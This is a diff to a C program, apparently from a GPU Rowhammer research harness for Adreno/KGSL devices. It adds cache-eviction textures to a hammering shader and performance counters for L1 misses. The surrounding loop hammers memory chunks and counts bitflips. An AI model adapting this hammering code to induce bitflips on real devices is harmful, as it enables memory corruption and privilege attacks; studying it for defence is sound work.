@@ -181,12 +181,18 @@ const char *hammeringShaderSource = "#version 300 es\n"
 	"uniform sampler2D evict7;\n" //  has size of 64 regular pages, needed to evict caches
 	"uniform sampler2D evict8;\n" //  has size of 64 regular pages, needed to evict caches
 	"uniform sampler2D evict9;\n" //  has size of 64 regular pages, needed to evict caches
+	"uniform sampler2D evict10;\n" //  has size of 64 regular pages, needed to evict caches
+	"uniform sampler2D evict11;\n" //  has size of 64 regular pages, needed to evict caches
+	"uniform sampler2D evict12;\n" //  has size of 64 regular pages, needed to evict caches
+	"uniform sampler2D evict13;\n" //  has size of 64 regular pages, needed to evict caches
+	"uniform sampler2D evict14;\n" //  has size of 64 regular pages, needed to evict caches
+	"uniform sampler2D evict15;\n" //  has size of 64 regular pages, needed to evict caches
 	"out vec4 val;\n"
 	"void main(){\n"
 	"	//int id = int(threadD.x) % 8;\n"
 	"	for(int i = 0; i < border; i++){\n"
 	"		\n"
-	"		val += texelFetch(row1, ivec2( 0, 0), 0) +"
+	"		val += texelFetch(row1, ivec2( 0, 0), 0) + "
 	"		 texelFetch(row2, ivec2(0,0), 0) + "
 	"		 texelFetch(evict1, ivec2(0, 0), 0) + "
 	"		 texelFetch(evict1, ivec2(0, 2), 0) + "
@@ -201,6 +207,28 @@ const char *hammeringShaderSource = "#version 300 es\n"
 
 	"		 texelFetch(evict5, ivec2(0, 0), 0) + "
 	"		 texelFetch(evict5, ivec2(0, 2), 0) + "
+	
+//	"                texelFetch(evict10, ivec2(0, 0), 0) + "
+  //      "                texelFetch(evict10, ivec2(0, 2), 0) + "
+	
+//	"                texelFetch(evict11, ivec2(0, 0), 0) + "
+  //      "                texelFetch(evict11, ivec2(0, 2), 0) + "
+
+//	"                texelFetch(evict12, ivec2(0, 0), 0) + "
+  //      "                texelFetch(evict12, ivec2(0, 2), 0) + "
+
+//	"                texelFetch(evict13, ivec2(0, 0), 0) + "
+  //      "                texelFetch(evict13, ivec2(0, 2), 0) + "
+
+//	"                texelFetch(evict14, ivec2(0, 0), 0) + "
+  //      "                texelFetch(evict14, ivec2(0, 2), 0) + "
+
+//	"                texelFetch(evict15, ivec2(0, 0), 0) + "
+  //      "                texelFetch(evict15, ivec2(0, 2), 0) + "
+
+//	"                texelFetch(evict9, ivec2(0, 0), 0) + "
+ //       "                texelFetch(evict9, ivec2(0, 2), 0) + "
+
 
 	"		 texelFetch(evict6, ivec2(0, 0), 0) + "
 	"		 texelFetch(evict6, ivec2(0, 2), 0) + "
@@ -560,7 +588,7 @@ int main(){
 	int bitflips = 0;
 	for(size_t i = 0; i < cont_kgsls; ++i){
 		// preparing program to run
-		struct kgsl_entry* evictarr[8];
+		struct kgsl_entry* evictarr[15];
 		struct kgsl_entry* row1 = kgsl_result[i];
 		// for(int j = 0; j < 16; ++j){
 		// 	row1 = row1->kgsl_next;
@@ -569,8 +597,8 @@ int main(){
 		struct kgsl_entry* victim = row1;
 		for(int j = 0; j < 16; ++j){
 			victim = victim->kgsl_next;
-			if( j < 8)
-				evictarr[j] = victim;
+//			if( j < 8)
+			evictarr[j] = victim;
 		}
 
 		struct kgsl_entry* row2 = victim;
@@ -649,23 +677,58 @@ int main(){
 			glUniform1i(evictionTexLocation,  9);
 			glActiveTexture(GL_TEXTURE0 + 9); // eviction Texture Unit
 			glBindTexture(GL_TEXTURE_2D, evictarr[7]->kgsl_id);
+		
+			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict9");
+			glUniform1i(evictionTexLocation,  10);
+			glActiveTexture(GL_TEXTURE0 + 10); // eviction Texture Unit
+			glBindTexture(GL_TEXTURE_2D, evictarr[8]->kgsl_id);
 			
+			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict10");
+			glUniform1i(evictionTexLocation,  11);
+			glActiveTexture(GL_TEXTURE0 + 11); // eviction Texture Unit
+			glBindTexture(GL_TEXTURE_2D, evictarr[9]->kgsl_id);
+	
+			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict11");
+			glUniform1i(evictionTexLocation,  12);
+			glActiveTexture(GL_TEXTURE0 + 12); // eviction Texture Unit
+			glBindTexture(GL_TEXTURE_2D, evictarr[10]->kgsl_id);
+	
+			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict12");
+			glUniform1i(evictionTexLocation,  13);
+			glActiveTexture(GL_TEXTURE0 + 13); // eviction Texture Unit
+			glBindTexture(GL_TEXTURE_2D, evictarr[11]->kgsl_id);
+	
+			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict13");
+                        glUniform1i(evictionTexLocation,  14);
+                        glActiveTexture(GL_TEXTURE0 + 14); // eviction Texture Unit
+                        glBindTexture(GL_TEXTURE_2D, evictarr[12]->kgsl_id);
+
+			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict14");
+                        glUniform1i(evictionTexLocation,  15);
+                        glActiveTexture(GL_TEXTURE0 + 15); // eviction Texture Unit
+                        glBindTexture(GL_TEXTURE_2D, evictarr[13]->kgsl_id);
+
+			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict15");
+                        glUniform1i(evictionTexLocation,  16);
+                        glActiveTexture(GL_TEXTURE0 + 16); // eviction Texture Unit
+                        glBindTexture(GL_TEXTURE_2D, evictarr[14]->kgsl_id);
+					
 			printf("Trying to hammer chunk %d : %d\n", i, k);
 			
 			row1TexLocation = glGetUniformLocation(shaderProgram2, "border");;
 			glUniform1i(row1TexLocation, 1000000);			
 			// running the program
 			GLuint group[2];
-			GLuint counter[2];
+			GLuint counter[3];
 			GLuint monitor;
 			GLuint *counterData;
 			unsigned int resultSize;
 			getCounterByName("VBIF", "AXI_READ_REQUESTS_TOTAL", &group[0],&counter[0]);
-    			// getCounterByName("UCHE", "UCHE_UCHEPERF_VBIF_READ_BEATS_TP", &group[0],&counter[0]);
     			getCounterByName("TP", "TPL1_TPPERF_TP0_L1_REQUESTS", &group[1],&counter[1]);
+    			getCounterByName("TP", "TPL1_TPPERF_TP0_L1_MISSES", &group[1],&counter[2]);
     			glGenPerfMonitorsAMD(1, &monitor);
 			glSelectPerfMonitorCountersAMD(monitor, GL_TRUE, group[0], 1 ,&counter[0]);   
-        		glSelectPerfMonitorCountersAMD(monitor, GL_TRUE, group[1], 1 ,&counter[1]);   
+        		glSelectPerfMonitorCountersAMD(monitor, GL_TRUE, group[1], 2 ,&counter[1]);   
 			glClearColor(0.0f, 0.0f, 0.0f, 0.0f);
 			glClear(GL_COLOR_BUFFER_BIT);
 	        	glBeginPerfMonitorAMD(monitor);    
